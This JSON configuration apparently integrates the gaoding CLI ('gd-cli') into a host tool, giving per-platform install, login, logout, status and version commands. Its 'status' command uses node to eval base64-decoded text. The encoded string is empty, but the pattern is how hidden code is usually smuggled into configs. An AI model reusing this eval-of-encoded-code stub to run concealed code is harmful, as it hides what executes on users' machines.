{
  "runtime": {
    "type": "node",
    "version": "22"
  },
  "init": {
    "darwin": "npm install -g --allow-scripts=@gaoding/cli @gaoding/cli@latest",
    "linux": "npm install -g --allow-scripts=@gaoding/cli @gaoding/cli@latest",
    "win32": "npm install -g --allow-scripts=@gaoding/cli @gaoding/cli@latest"
  },
  "auth": {
    "darwin": "gd-cli auth login --no-browser",
    "linux": "gd-cli auth login --no-browser",
    "win32": "gd-cli.cmd auth login --no-browser"
  },
  "unAuth": {
    "darwin": "gd-cli auth logout",
    "linux": "gd-cli auth logout",
    "win32": "gd-cli.cmd auth logout"
  },
  "status": {
    "darwin": "node -e \"eval(Buffer.from('','base64').toString())\"",
    "linux": "node -e \"eval(Buffer.from('','base64').toString())\"",
    "win32": "node -e \"eval(Buffer.from('','base64').toString())\""
  },
  "env": {
    "GD_CLI_INSTALL_OWNER": "workbuddy"
  },
  "authWaitForExit": true,
  "authUrlDomain": "www.gaoding.art",
  "statusMatch": "^GD_AUTHENTICATED(?:\\r?\\n)?$",
  "versionCheck": {
    "command": {
      "darwin": "gd-cli --version",
      "linux": "gd-cli --version",
      "win32": "gd-cli.cmd --version"
    },
    "minVersion": "1.5.4"
  }
}
